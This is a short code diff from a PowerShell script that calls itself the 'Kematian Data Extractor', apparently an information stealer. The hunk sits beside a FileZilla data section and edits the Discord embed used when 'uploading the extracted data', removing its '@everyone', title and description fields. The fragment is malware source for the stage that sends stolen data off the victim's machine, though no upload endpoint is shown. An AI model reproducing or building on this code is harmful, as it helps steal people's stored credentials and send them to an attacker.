@@ -1014,9 +1014,6 @@ FileZilla: $filezilla_info
     Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
-        "content"     = "@everyone"
-        "title"       = "Kematian Data Extractor"
-        "description" = "Kematian"
         "color"       = "15105570"
         "avatar_url"  = "https://i.imgur.com/6w6qWCB.jpeg"
         "url"         = "https://discord.com/invite/WJCNUpxnrE"
